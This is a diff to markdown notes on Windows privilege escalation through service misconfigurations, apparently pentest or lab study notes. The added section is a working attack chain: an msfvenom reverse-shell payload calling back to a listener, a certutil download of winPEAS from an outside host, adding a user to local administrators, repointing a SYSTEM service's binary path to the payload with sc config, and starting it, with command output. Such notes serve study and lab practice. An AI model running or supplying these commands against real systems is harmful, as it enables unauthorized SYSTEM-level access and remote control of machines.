@@ -235,14 +235,68 @@ Modify a configuration option of a service:
 ```bash
  sc.exe config <name> <option>= <value>
 ```
+Note the option name must be immediately followed by an equal sign and the space before the value. 
 Start/Stop a service:
 
 ```bash
  net start/stop <name>
  ```
 
+## 5 Types of Servie Misconfigurations:
+1. Insecure Service Properties
+2. unquoted Service Path
+3. Weak Registry Permission
+4. Insecure Service Executables
+5. DLL Hijacking
+
 ### accesschk
 
+## Insecure Service Permission
+If our user has permission to change the configuration of a
+service which runs with SYSTEM privileges, we can change
+the executable the service uses to one of our own.
+Potential Rabbit Hole: If you can change a service
+configuration but cannot stop/start the service, you may not
+be able to escalate privileges!
+
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o rev.exe
+
+certutil.exe -urlcache -split -f http://10.10.14.8/winPEAS-x64.exe winPEAS-x64.exe
+
+net localgroup administrators <username> /add
+
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o rev.exe
+
+winPEASany.exe quiet servicesinfo
+
+accesschk.exe /accepteula -uwcqv user daclsvc
+
+user=username
+daclsvc name of the service. 
+
+sc qc daclsvc
+
+sc config daclsvc binpath= "\"c:\Privesc\rev.exe\""
+
+QueryServiceConfig SUCCESS                                                                                                  
+                                                                                                                                 
+SERVICE_NAME: daclsvc                                                                                                            
+        TYPE               : 10  WIN32_OWN_PROCESS                                                                               
+        START_TYPE         : 3   DEMAND_START                                                                                    
+        ERROR_CONTROL      : 1   NORMAL                                                                                          
+        BINARY_PATH_NAME   : "c:\Privesc\rev.exe"                                                                                
+        LOAD_ORDER_GROUP   :                                                                                                     
+        TAG                : 0                                                                                                   
+        DISPLAY_NAME       : DACL Service                                                                                        
+        DEPENDENCIES       :                                                                                                     
+        SERVICE_START_NAME : LocalSystem 
+
+net start daclsvc
+```
 
 
 
